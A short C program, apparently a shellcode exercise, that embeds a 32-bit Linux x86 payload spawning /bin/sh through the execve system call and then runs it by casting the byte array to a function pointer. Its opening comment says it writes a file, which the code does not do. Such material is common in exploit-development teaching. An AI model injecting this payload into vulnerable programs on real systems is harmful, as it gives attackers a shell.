/*A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>

const char code[] =
"\x31\xc0"
"\x50"
"\x68""//sh"
"\x68""/bin"
"\x89\xe3"
"\x50"
"\x53"
"\x89\xe1"
"\x99"
"\xb0\x0b"
"\xcd\x80";

int main(int argc, char **argv){

	printf("Shellcode Length: %d\n", (int)sizeof(code)-1);
	int (*ret)() = (int(*)())code;
	ret();
	return 0;
}